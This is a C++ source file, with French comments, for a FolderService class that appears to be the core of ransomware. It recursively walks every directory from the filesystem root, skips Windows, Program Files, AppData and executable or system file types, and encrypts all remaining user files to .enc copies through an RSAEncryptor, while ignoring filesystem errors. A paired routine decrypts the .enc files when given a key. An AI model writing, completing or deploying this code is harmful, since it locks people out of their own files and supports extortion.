#include "Folderservice.h"

FolderService::FolderService() {
    // Initialisation de la liste statique des parties de chemins à écarter
    m_exclude_paths.push_back("\\Windows");
    m_exclude_paths.push_back("Windows");
    m_exclude_paths.push_back("windows");
    m_exclude_paths.push_back("Program Files");
    m_exclude_paths.push_back("\\Program Files");
    m_exclude_paths.push_back("Program Files (x86)");
    m_exclude_paths.push_back("\\Program Files (x86)");
    m_exclude_paths.push_back("ProgramData");
    m_exclude_paths.push_back("\\ProgramData");
    m_exclude_paths.push_back("\\AppData");
    m_exclude_paths.push_back("AppData");
    m_exclude_paths.push_back("OneDrive");
    m_exclude_paths.push_back("\\OneDrive");
    m_exclude_paths.push_back(".exe");
    m_exclude_paths.push_back(".dll");
    m_exclude_paths.push_back(".sys");
    m_exclude_paths.push_back(".bak");
    m_exclude_paths.push_back(".old");
    m_exclude_paths.push_back(".tmp");
    m_exclude_paths.push_back(".avhd");
    m_exclude_paths.push_back(".avh");
    m_exclude_paths.push_back(".avb");
    m_exclude_paths.push_back(".dvp");
    m_exclude_paths.push_back(".db");
    m_exclude_paths.push_back(".dat");
    m_exclude_paths.push_back(".log");
    m_exclude_paths.push_back(".sdb");
    m_exclude_paths.push_back(".swp");
    m_exclude_paths.push_back(".swo");
    m_exclude_paths.push_back(".vhd");
    m_exclude_paths.push_back(".bkf");
    m_exclude_paths.push_back(".svg");
    m_exclude_paths.push_back(".enc");
}

void FolderService::list_files_and_encrypt(RSAEncryptor* encrytpor) {
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory_and_encrypt(it->path(), encrytpor);
        }
    }
}

void FolderService::list_files_and_decrypt(RSAEncryptor* encrytpor, std::string key) {
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory_and_decrypt(it->path(), encrytpor, key);
        }
    }
}

void FolderService::list_files_in_directory_and_encrypt(boost::filesystem::path directory, RSAEncryptor* encrytpor) {
    try {
        for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
            std::string path = it->path().string();

            // Vérifie si le chemin contient l'une des parties de chemins à écarter
            bool exclude = false;
            for (const std::string& exclude_path : m_exclude_paths) {
                if (path.find(exclude_path) != std::string::npos) {
                    exclude = true;
                    break;
                }
            }

            if (!exclude) {
                if (boost::filesystem::is_regular_file(it->path())) {
                    std::string encFilePath = encrytpor->encryptFile(it->path());
                    m_data_files.push_back(encFilePath);
                } else if (boost::filesystem::is_directory(it->path())) {
                    list_files_in_directory_and_encrypt(it->path(), encrytpor);
                }
            }
        }
    } catch (const boost::filesystem::filesystem_error& e) {}
    catch (Exception ex) {
        throw ex;
    }
}

void FolderService::list_files_in_directory_and_decrypt(boost::filesystem::path directory, RSAEncryptor* decryptor, std::string key) {
    try {
        for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
                if (boost::filesystem::is_regular_file(it->path())) {
                    std::string path = it->path().string();
                    if(path.find(".enc") != std::string::npos) {
                        std::string encFilePath = decryptor->decryptFile(it->path(), key);
                        m_data_files.push_back(encFilePath);
                    }
                } else if (boost::filesystem::is_directory(it->path())) {
                    list_files_in_directory_and_decrypt(it->path(), decryptor, key);
                }
        }
    } catch (const boost::filesystem::filesystem_error& e) {}
    catch (Exception ex) {
        throw ex;
    }
}
